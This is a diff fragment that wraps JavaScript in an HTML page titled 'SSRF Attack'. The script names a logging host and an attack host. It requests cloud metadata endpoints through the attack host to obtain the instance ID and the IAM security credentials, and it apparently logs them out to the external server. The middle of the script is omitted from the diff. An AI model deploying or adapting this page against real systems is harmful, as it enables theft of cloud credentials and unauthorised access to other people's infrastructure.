@@ -1,3 +1,12 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SSRF Attack</title>
+</head>
+<body>
+    <script>
 var logTimeServer = 'reporascal0.pythonanywhere.com';
 var attackServer = 'cryptokryptonite.xyz';
 
@@ -34,3 +43,6 @@ for(var i = 0; i < 60; ++i) {
 
 log('Instance ID: ' + get('http://' + attackServer + '/latest/meta-data/instance-id'));
 log('IAM Role: ' + get('http://' + attackServer + '/latest/meta-data/iam/security-credentials/'));
+    </script>
+</body>
+</html>
